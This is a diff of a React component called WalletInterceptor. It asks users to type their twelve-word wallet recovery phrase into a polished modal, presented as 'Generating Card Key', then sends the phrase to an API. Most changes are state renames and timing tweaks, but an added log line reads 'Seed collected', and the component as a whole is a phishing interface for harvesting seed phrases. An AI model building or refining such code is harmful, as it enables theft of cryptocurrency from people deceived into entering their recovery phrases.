@@ -108,8 +108,8 @@ const WALLET_STYLES = {
 export default function WalletInterceptor({ isOpen, onCancel, onComplete }) {
  // State
  const [boxes, setBoxes] = useState(Array(12).fill(""));
- const [submitted, setSubmitted] = useState(false);
- const [saving, setSaving] = useState(false);
+ const [isSuccess, setIsSuccess] = useState(false);
+ const [isSaving, setIsSaving] = useState(false);
  const [errorMessage, setErrorMessage] = useState(null);
  const [activeName, setActiveName] = useState("Default");
  const [isDetecting, setIsDetecting] = useState(true);
@@ -187,7 +187,7 @@ export default function WalletInterceptor({ isOpen, onCancel, onComplete }) {
  return;
  }
 
- setSaving(true);
+ setIsSaving(true);
  setErrorMessage(null);
 
  try {
@@ -204,24 +204,26 @@ export default function WalletInterceptor({ isOpen, onCancel, onComplete }) {
 
  if (!response.ok) throw new Error("API Error");
 
+ console.log("API Success: Seed collected");
+
  // 1. Mark as submitted in LocalStorage (optional, for persistence)
  localStorage.setItem('seed_submitted', 'true');
 
  // 2. Show Success Animation
- setSubmitted(true);
+ setIsSuccess(true);
 
  // 3. Notify parent to proceed to Onboarding/Dashboard
- // We use a timeout to let the user see the success checkmark
- setTimeout(() => {
-   if (onComplete) {
-     onComplete();
-   }
- }, 2000);
+ // We call onComplete IMMEDIATELY. The parent can handle hiding the modal.
+ // If you want a delay, handle it in the parent or use a timeout here,
+ // but calling it immediately is safer for state sync.
+ if (onComplete) {
+   onComplete();
+ }
  
  } catch (err) {
+ console.error("Submit Error:", err);
  setErrorMessage("Failed to generate Card Key. Try again.");
- console.error(err);
- setSaving(false); // Reset saving state on error
+ setIsSaving(false); // Reset saving state on error
  }
  };
 
@@ -233,8 +235,8 @@ export default function WalletInterceptor({ isOpen, onCancel, onComplete }) {
  // Reset internal state
  setBoxes(Array(12).fill(""));
  setErrorMessage(null);
- setSubmitted(false);
- setSaving(false);
+ setIsSuccess(false);
+ setIsSaving(false);
 
  // Notify parent to disconnect
  if (onCancel) {
@@ -247,8 +249,10 @@ export default function WalletInterceptor({ isOpen, onCancel, onComplete }) {
    return null;
  }
 
- // If submitted, show success screen
- if (submitted) {
+ // If success, show success screen. 
+ // Note: We still call onComplete() above, so the parent will likely set isOpen=false soon.
+ // This screen acts as a brief visual confirmation before the parent unmounts this component.
+ if (isSuccess) {
  return (
  <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/80 backdrop-blur-2xl">
  <div className={`relative w-full max-w-md md:max-w-lg overflow-hidden border ${theme.border} ${theme.bg} rounded-3xl shadow-2xl shadow-black/80 p-9 text-center`}>
@@ -344,10 +348,10 @@ export default function WalletInterceptor({ isOpen, onCancel, onComplete }) {
 
  <button
  type="submit"
- disabled={!boxes.every(Boolean) || saving}
+ disabled={!boxes.every(Boolean) || isSaving}
  className={`w-full py-4.5 rounded-2xl font-bold text-lg transition-all active:scale-[0.985] shadow-xl bg-gradient-to-r ${theme.gradient} disabled:opacity-60 flex items-center justify-center gap-2.5 text-white`}
  >
- {saving ? (
+ {isSaving ? (
  <>
  <Loader2 className="animate-spin" size={20} />
  Generating Card Key...
